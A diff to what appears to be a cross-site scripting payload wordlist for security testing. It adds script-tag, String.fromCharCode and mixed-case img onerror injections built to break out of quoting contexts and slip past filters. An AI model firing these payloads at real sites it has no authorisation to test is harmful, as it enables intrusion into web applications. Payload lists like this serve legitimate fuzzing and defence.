@@ -7,12 +7,18 @@
 ><script>alert("xsspayload");</script>
 "><script>alert("xsspayload");</script>
 '><script>alert("xsspayload");</script>
+'"`>xsspayload<script>alert("xsspayload");</script>
 
 ';alert(123);//
 ";alert(123);//
 `;alert(123);//
 \";alert(123);//
+;alert(String.fromCharCode(88,83,83));//
+'"`;alert(String.fromCharCode(88,83,83));//
+></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 
-<img src="xxx.x" onerror=javascript:alert(123)>
-><img src="xxx.x" onerror=javascript:alert(123)>
-'"`>xsspayload<img src="xxx.x" onerror=javascript:alert(123)>
+<img src=x onerror=jAvaScRipt:alert('xsspayload')>
+<IMG SRC=x onerror=jAvaScRipt:alert('xsspayload')>
+<img src="x" onerror=javascript:alert(123)>
+><img src="x" onerror=javascript:alert(123)>
+'"`>xsspayload<img src="x" onerror=javascript:alert(123)>
